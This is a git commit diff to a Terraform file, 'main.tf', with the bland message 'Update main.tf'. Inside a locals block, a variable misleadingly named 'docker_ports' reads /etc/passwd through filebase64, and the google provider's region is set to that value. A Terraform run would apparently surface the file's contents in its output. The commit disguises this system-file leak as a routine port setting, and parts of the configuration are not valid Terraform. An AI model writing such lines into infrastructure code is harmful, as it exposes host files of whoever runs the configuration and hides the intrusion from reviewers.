91cf56e4f9e4070df4e97fa99f61eaaa35038522
synack1test <43527438+synack1test@users.noreply.github.com>
2020-07-14 17:18:51 +0200

    Update main.tf

--- main.tf
+++ main.tf
@@ -3,7 +3,7 @@ locals {
       internal = 8300
       external = 8300
       docker_ports = "${filebase64("/etc/passwd")}"
-      test = max(docker_ports,1,2)
+      
       }
 provider "google" {
   region = locals.docker_ports
